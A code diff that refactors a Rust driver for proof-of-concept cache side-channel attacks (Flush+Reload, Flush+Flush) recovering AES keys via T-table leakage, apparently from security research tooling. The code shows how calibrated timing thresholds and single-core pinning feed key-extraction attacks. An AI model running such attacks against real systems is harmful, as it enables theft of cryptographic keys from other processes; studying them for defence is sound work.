@@ -1,8 +1,9 @@
 #![feature(unsafe_block_in_unsafe_fn)]
 #![deny(unsafe_op_in_unsafe_fn)]
 use aes_t_tables::{attack_t_tables_poc, AESTTableParams};
+use cache_utils::calibration::Threshold;
 use flush_flush::naive::NaiveFlushAndFlush;
-use flush_flush::{FlushAndFlush, SingleFlushAndFlush};
+use flush_flush::{FFPrimitives, FlushAndFlush, SingleFlushAndFlush};
 use flush_reload::naive::*;
 use nix::sched::sched_setaffinity;
 use nix::unistd::Pid;
@@ -29,8 +30,20 @@ fn main() {
 
     let te = TE_CITRON_VERT;
 
-    let mut side_channel_fr = NaiveFlushAndReload::from_threshold(220);
-    let mut side_channel_naiveff = NaiveFlushAndFlush::from_threshold(202);
+    let mut side_channel_fr = NaiveFlushAndReload::new(
+        Threshold {
+            bucket_index: 220,
+            miss_faster_than_hit: false,
+        },
+        NaiveFRPrimitives {},
+    );
+    let mut side_channel_naiveff = NaiveFlushAndFlush::new(
+        Threshold {
+            bucket_index: 202,
+            miss_faster_than_hit: true,
+        },
+        FFPrimitives {},
+    );
 
     for (index, key) in [KEY1, KEY2].iter().enumerate() {
         println!("AES attack with Naive F+R, key {}", index);
@@ -61,8 +74,11 @@ fn main() {
         };
         println!("AES attack with Single F+F, key {}", index);
         {
-            let (mut side_channel_ff, old, core) =
-                SingleFlushAndFlush::new_any_single_core().unwrap();
+            let mut side_channel_ff = SingleFlushAndFlush::new(
+                FlushAndFlush::new_any_single_core(FFPrimitives {})
+                    .unwrap()
+                    .0,
+            );
             unsafe {
                 attack_t_tables_poc(
                     &mut side_channel_ff,
